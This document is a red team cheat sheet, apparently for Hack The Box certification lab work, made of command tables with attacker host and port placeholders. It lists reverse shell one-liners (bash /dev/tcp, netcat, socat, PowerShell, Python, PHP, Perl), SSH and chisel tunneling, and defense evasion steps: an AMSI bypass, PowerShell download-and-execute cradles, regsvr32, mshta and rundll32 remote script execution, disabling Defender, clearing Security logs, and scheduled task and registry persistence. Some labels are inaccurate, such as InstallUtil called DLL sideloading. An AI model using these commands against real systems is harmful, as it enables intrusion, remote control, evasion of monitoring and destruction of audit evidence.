# 🛠 HTB CDSA Red Team Reference

## 🔧 Variable Inputs

Before using the commands below, define your variables:

| Variable      | Description                         | Example             |
|---------------|-------------------------------------|---------------------|
| `{{LHOST}}`   | Local host IP (attacker)            | `10.10.14.4`        |
| `{{LPORT}}`   | Local port                          | `9001`              |
| `{{RHOST}}`   | Remote host IP (target)             | `10.10.10.32`       |
| `{{RPORT}}`   | Remote port                         | `443`               |
| `{{USER}}`    | Username                            | `mark`              |
| `{{FILENAME}}`| File name or payload name           | `nc.exe`            |
| `{{URL}}`     | Full URL to hosted payload          | `http://{{LHOST}}/{{FILENAME}}` |

---

## 🔁 Reverse Shells

| **Command** | **Description** | **Modifiers / Notes** |
|-------------|------------------|------------------------|
| `powershell -nop -w hidden -c "$client = New-Object System.Net.Sockets.TCPClient('{{LHOST}}',{{LPORT}});..."` | PowerShell TCP reverse shell | `-nop` = no profile, `-w hidden` = no window |
| `bash -i >& /dev/tcp/{{LHOST}}/{{LPORT}} 0>&1` | Bash reverse shell | Works on most Linux targets |
| `python -c 'import socket,subprocess,os; s=socket.socket(); s.connect(("{{LHOST}}",{{LPORT}})); ...'` | Python reverse shell | Use `python3` if needed |
| `php -r '$sock=fsockopen("{{LHOST}}",{{LPORT}}); exec("/bin/sh -i <&3 >&3 2>&3");'` | PHP reverse shell | Requires PHP installed |
| `perl -e 'use Socket;$i="{{LHOST}}";$p={{LPORT}};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));...'` | Perl reverse shell | Legacy but effective |
| `nc -e /bin/sh {{LHOST}} {{LPORT}}` | Netcat reverse shell | Requires `-e` support |
| `nc -c /bin/bash {{LHOST}} {{LPORT}}` | Netcat with `-c` flag | Alpine or BusyBox targets |
| `socat TCP:{{LHOST}}:{{LPORT}} EXEC:/bin/bash` | Socat reverse shell | Use `-d -d` for debug |

---

## 🧩 Tunneling & Pivoting

| **Command** | **Description** | **Modifiers / Notes** |
|-------------|------------------|------------------------|
| `ssh -L 8080:localhost:80 {{USER}}@{{RHOST}}` | Local port forwarding | Access remote web service locally |
| `ssh -R 9001:localhost:22 {{USER}}@{{RHOST}}` | Remote port forwarding | Expose local SSH to remote |
| `ssh -D 1080 {{USER}}@{{RHOST}}` | Dynamic SOCKS proxy | Use with proxychains |
| `plink.exe -ssh {{USER}}@{{RHOST}} -L 8080:127.0.0.1:80` | Windows SSH tunneling | GUI alternative to OpenSSH |
| `chisel server -p {{LPORT}} --reverse` | Chisel reverse proxy server | Use `client` on target |
| `chisel client {{LHOST}}:{{LPORT}} R:9001:127.0.0.1:22` | Chisel client reverse tunnel | Pivot SSH from target |
| `proxychains nmap -sT -Pn -n -v {{RHOST}}` | Proxy-aware Nmap scan | Configure `/etc/proxychains.conf` |
| `sshuttle -r {{USER}}@{{RHOST}} 0.0.0.0/0` | Full VPN-like tunnel | Requires Python on both ends |
| `rdesktop {{RHOST}} -u {{USER}}` | RDP access | Use `xfreerdp` for clipboard/file sharing |

---

## 🛡️ Detection Bypass & Defense Evasion

| **Command** | **Description** | **Modifiers / Notes** |
|-------------|------------------|------------------------|
| `[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)` | AMSI bypass in PowerShell | Use in-memory execution |
| `powershell -ep bypass -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('{{URL}}')"` | Bypass execution policy | `-ep bypass`, `-nop`, `-w hidden` |
| `regsvr32 /u /n /s /i:"{{URL}}" scrobj.dll` | COM scriptlet execution | Fileless, proxy-aware |
| `mshta "{{URL}}"` | HTA-based execution | Often whitelisted |
| `rundll32 javascript:"\..\mshtml,RunHTMLApplication";document.write('<script src="{{URL}}"></script>')` | JavaScript via DLL | Fileless, stealthy |
| `Set-MpPreference -DisableRealtimeMonitoring $true` | Disable Defender (if allowed) | Requires admin |
| `wevtutil cl Security` | Clear event logs | Highly suspicious |
| `schtasks /create /tn "Updater" /tr "{{FILENAME}}" /sc minute /mo 1` | Scheduled task persistence | Use `/ru SYSTEM` for privilege |
| `reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Updater /t REG_SZ /d "{{FILENAME}}"` | Registry run key | User-level persistence |
| `InstallUtil.exe /logfile= /LogToConsole=false /U {{FILENAME}}` | DLL sideloading | Use with malicious .NET assemblies |


